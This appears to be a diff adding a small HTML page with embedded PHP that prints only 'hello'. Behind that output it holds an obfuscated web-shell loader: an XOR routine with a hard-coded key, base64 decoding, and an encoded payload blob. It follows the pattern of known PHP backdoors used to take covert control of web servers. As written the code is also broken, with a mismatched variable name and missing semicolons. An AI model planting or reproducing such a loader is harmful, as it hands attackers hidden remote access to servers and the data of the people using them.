@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title></title>
+		<button></button>
+	</head>
+	<body>
+		<?php
+			function E($D,$K){
+				for($i=0;$i<strlen($D);$i++){
+					$D[$i] = $D[$i]^$K[($i+1)&15];
+				}
+				return $D;
+			}
+			
+			function O($D){
+				return base64_decode($D);
+			}
+			
+			$p='11cd6a8758984163B2EJWzJsLEMoeVEBVk1QWDpuN1gpayNXAmZkC39OLFwHBQEDLm8zUQd2cEJ7cwVKAQUzRwFCUUMuSF0BVgcCRzlxIwA7awpy6c37ac826a2a04bc'
+			$T='3c6e0b8a9c15224a'
+			$F=O(E(O($P),$T));
+			echo "hello";
+		?>
+	</body>
+</html>
+
